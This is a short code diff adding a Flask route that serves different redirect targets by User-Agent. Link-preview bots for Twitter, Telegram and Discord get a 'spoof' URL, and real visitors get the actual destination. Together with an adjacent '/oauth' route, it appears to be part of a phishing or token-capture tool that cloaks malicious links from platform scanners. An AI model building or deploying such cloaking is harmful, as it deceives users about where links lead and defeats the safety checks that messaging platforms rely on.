@@ -21,6 +21,29 @@ try:
 except Exception as e:
     print("[-] MongoDB connection failed:", e)
 
+JSON_FILE = "data.json"
+
+def load_data():
+    try:
+        with open(JSON_FILE, "r") as file:
+            return json.load(file)
+    except (FileNotFoundError, json.JSONDecodeError):
+        return {} 
+
+def get_entry(key):
+    data = load_data()
+    return data.get(key, "Key not found.")
+
+@app.route('/link')
+def link():
+    user_agent = request.headers.get('User-Agent', '').strip()
+    v = request.args.get('v')
+    data = get_entry(v)
+    
+    if 'Twitterbot/1.0' in user_agent or 'TelegramBot' in user_agent or 'Discordbot' in user_agent:
+        return redirect(data["spoof"])
+    
+    return redirect(data["redirect"])
 
 @app.route('/oauth')
 def oauth():
